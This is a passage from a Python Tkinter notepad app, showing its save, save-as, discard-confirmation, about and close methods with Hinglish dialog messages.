    def save(self):
        if not self.current_file:
            return self.save_as()
        try:
            with open(self.current_file, "w", encoding="utf-8") as handle:
                handle.write(self.editor.get("1.0", "end-1c"))
        except OSError as exc:
            messagebox.showerror(APP_NAME, "Save nahi hua:\n" + str(exc))
            return
        self.dirty = False
        self.update_status()

    def save_as(self):
        path = filedialog.asksaveasfilename(
            title="Save As", defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        self.current_file = path
        self.save()

    def _confirm_discard(self):
        if not self.dirty:
            return True
        answer = messagebox.askyesnocancel(
            APP_NAME, "Bina save kiye band karna hai?")
        if answer is None:
            return False
        if answer:
            self.save()
        return True

    def about(self):
        messagebox.showinfo(
            "About",
            APP_NAME + " " + VERSION + "\n\n"
            "Ek simple notepad.\n"
            "Ctrl+S save, Ctrl+O open, Ctrl+N naya.")

    def on_close(self):
        if self._confirm_discard():
            self.destroy()


def main():
    app = NotesApp()
    app.mainloop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
